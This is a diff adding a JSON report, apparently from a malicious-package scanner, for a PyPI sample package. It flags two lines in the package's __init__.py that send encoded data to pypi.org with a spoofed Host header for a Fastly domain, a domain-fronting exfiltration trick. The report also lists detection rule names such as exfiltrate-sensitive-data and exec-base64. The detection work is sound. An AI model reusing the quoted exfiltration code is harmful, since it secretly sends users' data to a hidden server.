@@ -1,0 +1,29 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "src/example_package/__init__.py:89",
+                "code": "r = request.Request('https://pypi.org/reqs?d=', data = encoded, headers={'Host': 'psec.forward.io.global.prod.fastly.net'})\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "src/example_package/__init__.py:90",
+                "code": "k = request.urlopen(r)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "download-executable": {},
+        "silent-process-execution": {},
+        "cmd-overwrite": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/important_package-0.1.14"
+}
